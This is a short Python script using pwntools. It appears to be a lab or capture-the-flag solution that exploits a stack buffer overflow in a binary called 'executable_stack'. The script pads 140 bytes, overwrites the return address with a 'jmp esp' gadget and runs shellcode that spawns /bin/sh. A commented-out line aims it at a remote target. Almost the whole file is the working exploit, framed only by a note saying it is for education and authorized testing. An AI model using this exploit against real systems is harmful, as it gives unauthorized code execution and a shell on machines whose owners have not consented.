#!/usr/bin/env python3
"""
Buffer overflow exploit for executable_stack binary.
This script demonstrates exploiting a buffer overflow vulnerability.
For educational purposes and authorized security testing only.
"""
from pwn import *
import sys

# Set target architecture
context.update(arch='i386', os='linux')

# Choose connection method:
# Local process
io = process("./executable_stack")

# Remote connection (uncomment and configure as needed)
# io = remote('target_host', target_port)

"""
Debug mode - uncomment to find offset using cyclic pattern:

gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exit()
"""

# Load binary and find gadget
binary = ELF("./executable_stack")
jmp_esp = next(binary.search(asm("jmp esp")))

print("[*] Found 'jmp esp' gadget at: {}".format(hex(jmp_esp)))

# Build exploit payload
exploit = flat([
    b"A" * 140,              # Padding to reach return address
    pack(jmp_esp),           # Overwrite RET with jmp esp gadget
    asm(shellcraft.sh())     # Shellcode to spawn shell
])

print("[*] Sending exploit payload...")
io.sendline(exploit)
io.interactive()
